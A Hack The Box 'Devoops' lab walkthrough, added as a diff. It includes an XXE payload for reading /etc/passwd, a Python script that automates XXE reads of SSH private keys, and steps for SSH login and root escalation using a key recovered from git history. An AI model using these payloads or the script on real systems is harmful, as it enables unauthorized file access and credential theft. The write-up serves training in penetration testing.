@@ -1,0 +1,147 @@
+HTB-Devoops-Writeup
+
+IP : 10.10.10.91
+
+Nmap 
+----
+- nmap scan found 2 open ports 
+	- 22 running SSH
+	- 5000 running http
+
+- based on the SSH version the host is likely Ubuntu 16.04 Xenial
+
+Enumeration
+-----------
+- checking port 5000 for main page we get an image and some texts, nothing of much use to us 
+- we can try directory brute forcing the page 
+
+	gobuster -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 30
+
+- we got 2 directories 
+	- /feed
+	- /upload
+
+- /feed consists of the image we found on the root page 
+- /upload gives a file upload page expecting xml files
+- since we have xml upload we can check for XXE vulnerability 
+- we can create an XML file and upload it 
+
+	<Author>lord</Author>
+	<Subject>testapp</Subject>
+	<Content>bsdk_chall</Content>
+
+- upload it and intercept the request with burp and send to repeater 
+- change the content-Type to text
+- send the request and we can see that the XML got executed
+- we can search for an XXE payload and try to use that to exploit this
+
+	 <?xml version="1.0"?>
+	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+	<Container>
+	<Author></Author>
+	<Subject></Subject>
+	<Content>
+	       &xxe;
+	</Content>
+	</Container>
+
+- edit the request and send this payload via repeater 
+- we get the contents of /etc/passwd file
+- we have read access to the server
+
+Shell as roosa
+--------------
+- we can grep for users with bash access and try to read their ssh keys with XXE
+- we can do this manually by replacing the path in the payload we used before or can automate it with a python3 script
+
+	 #!/usr/bin/python3
+
+	import re
+	import requests
+	import sys
+
+	if len(sys.argv) < 2:
+	    print(f"usage: {sys.argv[0]} [path to file]")
+	    sys.exit()
+
+	file_name = sys.argv[1]
+
+	xml = f'''<?xml version="1.0" encoding="utf-8"?>
+	<!DOCTYPE foo [
+	  <!ELEMENT foo ANY>
+	  <!ENTITY bar SYSTEM "file://{file_name}">
+	]>
+
+	<item>
+	<Author>
+	&bar;
+	</Author>
+	<Subject>Testing</Subject>
+	<Content>This is a test</Content>
+	</item>'''
+
+	files = {'file': ('xxe.xml', xml, 'text/xml')}
+	proxies = {'http': 'http://127.0.0.1:8080'}
+	try:
+	    r = requests.post('http://10.10.10.91:5000/upload', files=files, proxies=proxies)
+	    if r.status_code == 200:
+	        pattern = re.compile(r"Author: \n(.*)\n Subject:", flags=re.DOTALL)
+	        print(re.search(pattern, r.text).group(1).strip())
+	        sys.exit()
+	    else:
+	        pass
+	except requests.exceptions.ConnectionError:
+	    pass
+	print("[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.")
+
+- save this as devoops_get.py
+- run the script with the ssh paths for the users 
+
+	 ./devoops_get.py /root/.ssh/id_rsa
+
+	 ./devoops_get.py /home/git/.ssh/id_rsa
+
+	 ./devoops_get.py /home/roosa/.ssh/id_rsa
+
+- we get ssh key for the user roosa
+- copy and save as roosa_id_rsa
+- change mode
+
+	chmod 600 roosa_id_rsa
+
+- ssh into the box as roosa with the private key
+
+	ssh roosa@10.10.10.91 -i roosa_id_rsa
+
+- we got a shell as roosa
+- grab the user flag 
+
+Priv-esc
+--------
+- on further enumeration we found a git repo (.git file) on roosas home directoey
+- we can look for .git file using find command 
+
+	find / -type d -name '.git' 2>/dev/null
+
+- looking more closely at the git repo 
+
+	git status
+
+- we found the branch is up to date and there is a bunch of untracked files 
+- we can also look at the git history to get info on list of files changed in each commit    
+
+	git log --name-only --oneline
+
+- we found resources/integration/authcredentials.key
+- grab the ssh key
+
+	cat resources/integration/authcredentials.key
+
+- save and give permission 
+- ssh into the machine as root with the ssh private key
+
+	 ssh -i ~/rsa_keys/id_rsa_devoops_root root@10.10.10.91
+
+- we got shell as root
+- grab the root flag
+ 
